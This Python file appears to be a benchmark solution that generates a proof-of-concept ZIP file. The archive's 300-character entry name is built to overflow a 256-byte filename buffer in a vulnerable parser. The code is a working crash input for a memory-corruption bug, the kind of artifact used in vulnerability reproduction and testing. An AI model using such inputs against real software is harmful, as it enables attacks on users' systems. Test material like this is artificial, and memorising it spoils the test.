import io
import os
import struct
import zipfile
import tempfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a zip file with a single entry having a long filename (>256 chars)
        # We'll use minimal overhead to keep the PoC as short as possible
        # while still triggering the overflow
        
        # Create a filename with 300 characters (exceeds 256-byte buffer)
        filename = "A" * 300
        
        # Use BytesIO to create zip in memory
        buffer = io.BytesIO()
        
        # Create zip file with minimal settings
        with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_STORED, allowZip64=False) as zf:
            # Create a ZipInfo with our long filename
            zip_info = zipfile.ZipInfo(filename)
            # Set minimal headers
            zip_info.compress_type = zipfile.ZIP_STORED
            zip_info.file_size = 0
            zip_info.compress_size = 0
            zip_info.CRC = 0
            zip_info.flag_bits = 0x800  # Use UTF-8 encoding flag
            
            # Add empty file
            zf.writestr(zip_info, b'')
        
        # Get the raw bytes
        poc_bytes = buffer.getvalue()
        
        # Ensure we have exactly the right structure by recreating with custom method
        # for maximum control and minimal size
        return self._create_minimal_zip(filename)

    def _create_minimal_zip(self, filename: str) -> bytes:
        """Create minimal zip file with exact control over structure"""
        # Local file header
        local_header = b'PK\x03\x04'  # signature
        local_header += struct.pack('<H', 20)  # version needed to extract (2.0)
        local_header += struct.pack('<H', 0x800)  # general purpose bit flag (UTF-8)
        local_header += struct.pack('<H', 0)  # compression method (stored)
        local_header += struct.pack('<H', 0)  # last mod file time
        local_header += struct.pack('<H', 0)  # last mod file date
        local_header += struct.pack('<I', 0)  # crc32
        local_header += struct.pack('<I', 0)  # compressed size
        local_header += struct.pack('<I', 0)  # uncompressed size
        local_header += struct.pack('<H', len(filename))  # filename length
        local_header += struct.pack('<H', 0)  # extra field length
        local_header += filename.encode('utf-8')
        
        # Central directory header
        central_header = b'PK\x01\x02'  # signature
        central_header += struct.pack('<H', 20)  # version made by
        central_header += struct.pack('<H', 20)  # version needed to extract
        central_header += struct.pack('<H', 0x800)  # general purpose bit flag
        central_header += struct.pack('<H', 0)  # compression method
        central_header += struct.pack('<H', 0)  # last mod file time
        central_header += struct.pack('<H', 0)  # last mod file date
        central_header += struct.pack('<I', 0)  # crc32
        central_header += struct.pack('<I', 0)  # compressed size
        central_header += struct.pack('<I', 0)  # uncompressed size
        central_header += struct.pack('<H', len(filename))  # filename length
        central_header += struct.pack('<H', 0)  # extra field length
        central_header += struct.pack('<H', 0)  # file comment length
        central_header += struct.pack('<H', 0)  # disk number start
        central_header += struct.pack('<H', 0)  # internal file attributes
        central_header += struct.pack('<I', 0)  # external file attributes
        central_header += struct.pack('<I', 0)  # relative offset of local header
        central_header += filename.encode('utf-8')
        
        # End of central directory record
        end_central = b'PK\x05\x06'  # signature
        end_central += struct.pack('<H', 0)  # disk number
        end_central += struct.pack('<H', 0)  # disk with start of central directory
        end_central += struct.pack('<H', 1)  # number of central directory records on this disk
        end_central += struct.pack('<H', 1)  # total number of central directory records
        end_central += struct.pack('<I', len(central_header))  # size of central directory
        end_central += struct.pack('<I', len(local_header))  # offset of start of central directory
        end_central += struct.pack('<H', 0)  # comment length
        
        # Combine all parts
        zip_data = local_header + central_header + end_central
        
        return zip_data